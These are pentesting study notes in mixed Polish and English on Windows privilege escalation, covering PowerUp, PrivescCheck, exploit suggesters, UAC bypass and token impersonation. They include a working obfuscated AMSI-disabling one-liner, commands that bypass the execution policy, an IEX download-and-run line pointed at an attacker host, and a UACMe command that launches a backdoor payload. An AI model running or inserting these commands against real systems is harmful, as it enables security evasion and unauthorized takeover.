# Hacktrix
https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/

# Privilege Escalation

# Identyfying PrivEsc Vulns

## $ PowerUp.ps1
program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities.
https://rootrecipe.medium.com/advanced-powerup-ps1-usage-ad0f6d713a9f
### Loading From Disc

```PowerShell
# (PowerShell execution policy bypass)
powershell -ep bypass 
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

# chyba opcjonalnie
# disable AMSI (probably hasn’t been patched by Microsoft)
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

# Running PowerUp.ps1
PS C:\> Import-Module PowerUp.ps1PS 
C:\> . .\PowerUp.ps1
```

### Loading From Your Kali Apache Server
```PowerShell
PS C:\> IEX(New-Object Net.WebClient).DownloadString(‘http://<kali_ip>/PowerUp.ps1’)
```

## $ PrivescCheck

https://github.com/itm4n/PrivescCheck

```PowerShell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
runas.exe /user:administrator cmd
```

## Windows PrivEsc

*Winlogon*- automatyczne logowanie użytkownika  
obtaining user account credentials protocols we use to authenticate with the Windows target: **RDP, SMB, WinRM**

# Kernel

## Windows-Exploi-Sugester

**Stara Wersja**: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

**Nowa Wersja**: https://github.com/bitsadmin/wesng

## $ windows-privesc-check

paczka w kali

## $ msf>local_exploit_suggester

mając sesję meterpreter można zanaleźć exploit do podniesienia uprawnień

# User Acces Control Bypass

- UAC to prompt o hasło do lokalnego administratora jeśli użytkownik nie jest adminem lub jeśli jest to pytajacy o potwierdzenie wykonania akcji.
- Jeśli ma sie shella i chce się wykonać coś z uprawnieniami administratora to nie ma możliwości interakcji z tym oknem.
- UAC pozwala na wykonanie programu z uprawnieniami admina.
- **Wymagane jest konto admina lokalnego** na maszynie aby wykonać UAC bypass.
## $ msf
![[Metasploit#Bypas UAC]]

## UACMe

https://github.com/hfiref0x/UACME

```PowerShell
# wgrać na maszynę program Akagi (UACMe) oraz payload
# wykonać program za pomocą Akagi64.exe
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.ex
```
# Access Token Impersonation

Windows access tokens are a core element of the authentication process on Windows and are created and managed by the **Local Security Authority Subsystem Service (LSASS)**.

Access tokens are generated by the winlogon.exe (login page) process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process.  

This token is then attached to the userinit.ex (proces używany do uruchamiania innych procesów) process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.

An access token will typically be assigned one of the following security levels:

- **Impersonate-level tokens** are created as a direct result of a **non-interactive login on Windows**, typically through specific system services or domain logons.
- **Delegate-level tokens** are typically created through an **interactive login on Windows**, primarily through a traditional login or through remote access protocols such as RDP.

Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.  
Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.

The following are the **privileges that are required** for a successful impersonation attack:

- SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.

Dodatkowe
- SeAssignPrimaryToken: This allows a user to impersonate tokens.
- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.

## $ msf>incognito
![[Metasploit#incognito]]

## PrivescCheck
https://github.com/itm4n/PrivescCheck